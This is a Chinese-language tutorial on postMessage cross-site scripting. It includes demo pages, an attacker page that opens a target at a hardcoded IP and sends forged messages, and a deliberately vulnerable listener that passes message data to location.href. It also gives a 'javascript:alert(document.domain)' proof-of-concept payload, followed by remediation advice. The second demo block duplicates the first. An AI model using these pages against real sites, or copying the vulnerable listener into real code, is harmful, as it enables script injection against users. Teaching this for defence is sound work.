#  PostmessageXSS 漏洞

> ```
> Window.postmessage()方法可以安全地实现Window对象之间的跨源通信;例如，在页面和它派生的弹出窗口之间，或者在页面和其内嵌的iframe之间。
> ```

https://www.cnblogs.com/piaomiaohongchen/p/14727871.html

## 漏洞利用方式

demo1 代码

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
 <meta charset="utf-8" />
<script>
function openChild() {
    child = window.open('demo2.html', 'popup', 'height=300px, width=500px');
}
function sendMessage(){
    //发送的数据内容
    let msg={pName : "jack", pAge: "12"};
    //发送消息数据数据到任意目标源, *指的是任意anyone
    child.postMessage(msg,'*');
}
</script>
</head>
<body>
    <form>
        <fieldset>
            <input type='button' id='btnopen' value='Open child' onclick='openChild();' />
            <input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' />
        </fieldset>
    </form>
</body>
</html>
```

demo2 代码  

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
 <meta charset="utf-8" />
<script>
function openChild() {
    child = window.open('demo2.html', 'popup', 'height=300px, width=500px');
}
function sendMessage(){
    //发送的数据内容
    let msg={pName : "jack", pAge: "12"};
    //发送消息数据数据到任意目标源, *指的是任意anyone
    child.postMessage(msg,'*');
}
</script>
</head>
<body>
    <form>
        <fieldset>
            <input type='button' id='btnopen' value='Open child' onclick='openChild();' />
            <input type='button' id='btnSendMsg' value='Send Message' onclick='sendMessage();' />
        </fieldset>
    </form>
</body>
</html>
```



### 数据伪造

```
<!DOCTYPE html>
<html>
<head>
    <title></title>
 <meta charset="utf-8" />
<script>
childwin = window.open('http://119.45.227.86/postmessage/demo2.html');

function sendMessage(){
    let msg={pName : "attacker", pAge: "16"};
    childwin.postMessage(msg,'*')
}

(function(){setTimeout("sendMessage()",1000);}()); 
</script>
</head>
</html>
```

> demo 1中存在以下代码，可以利用postMessage 传递信息。
>
> ```
> function sendMessage(){
>     //发送的数据内容
>     let msg={pName : "jack", pAge: "12"};
>     //发送消息数据数据到任意目标源, *指的是任意anyone
>     child.postMessage(msg,'*');
> }
> ```
>
> demo 2中存在以下代码，可以接收 postMessage传递过来的信息
>
> ```
> <script>
>         //添加事件监控消息
>     window.addEventListener("message", (event)=>{
>         let txt=document.getElementById("msg");
>         //接收传输过来的变量数据
>         txt.value=`Name is ${event.data.pName} Age is  ${event.data.pAge}` ;
> 
>     });
>     </script>
> ```
>
> 所以demo1 可以调用 PostMessage 接口传递信息，进而修改demo2显示的内容。
>
> 这里要注意两点：
>
> - postMessage 强调的是同一浏览器中页面之间的通讯(通过参数传递)，并不能修改服务器中的内容
> - 漏洞利用首先要打开2个页面(必须要有一个是漏洞网站的)，另外一个可以诱骗受害者点击的

> 利用步骤：
>
> ```
> <!DOCTYPE html>
> <html>
> <head>
>     <title></title>
>  <meta charset="utf-8" />
> <script>
> childwin = window.open('http://119.45.227.86/postmessage/demo2.html');
> 
> function sendMessage(){
>     let msg={pName : "attacker", pAge: "16"};
>     childwin.postMessage(msg,'*')
> }
> 
> (function(){setTimeout("sendMessage()",1000);}()); 
> </script>
> </head>
> </html>
> ```
>
> 执行分2步，首先打开一个子页面（demo2.html），接下来使用postMessage 传递参数，demo2.html中
>
> let txt=document.getElementById("msg"); 会接收我们从attacker.html传递的信息。
>
> (此处实际上是会被浏览器所拦截的(URL跳转)，需要浏览器选择不拦截)

### XSS漏洞

> ​		从数据伪造中可以看到，如果有 window.addEventListener("message", (event)=>这类接收postMessage传递参数的函数，那么就可以构造HTML文件，(此HTML功能第一步是打开可网站可传参的界面，第二步是向其传递参数(js层面))。
>
> 如果addEventListener 接收的**参数**会被一些危险函数(如下文的location.href)执行，是不是就有可能构造出一个反射型XSS呢？
>
> 服务器放入xss.html开始测试
>
> ```
> <!DOCTYPE html>
> <html>
> <head>
>     <title></title>
>     <meta charset="utf-8" />
>     <script>
>     window.addEventListener("message", (event)=>{
>         location.href=`${event.data.url}`;
>     });
>     </script>
> </head>
> </html>
> 
> 
> ```
>
> 
>
> ```
> <!DOCTYPE html>
> <html>
> <head>
>     <title></title>
>  <meta charset="utf-8" />
> <script>
> childwin = window.open('http://119.23.189.100/xss.html');
> 
> function sendMessage(){
>     let msg={url:"javascript:alert(document.domain)"};
>     childwin.postMessage(msg,'*')
> }
> 
> (function(){setTimeout("sendMessage()",1000);}()); 
> </script>
> </head>
> </html>
> ```
>
> ![img](file:///C:\Users\游俊豪\Documents\Tencent Files\1571229403\Image\C2C\%}NEV5Q]QU07~075N8TPNZA.png)
>
> 关闭拦截后，刷新，首先是URL跳转，其次是弹出xss界面。

## 问题一:代码为什么会被执行

> 白帽子利用postMessage传参，通过层层调用链传递到 r.href参数s(通过URL重定向到白帽子的xss网站(x0.nz/q7pm#)),最后进行了弹窗。

## 问题二：是所有Postmessage 接口都会产生此类漏洞么，产生漏洞的条件

> 并不是所有PostMessage接口都存在此漏洞，攻击者要查看前端js代码，看一些特定参数是否可以控制（比如说location.href的参数），然后精心构造Payload。

## 问题三：修复方案

　**1.限制发送目标，禁止使用\***

　　**2.限制接收数据event.origin，使用指定信任域**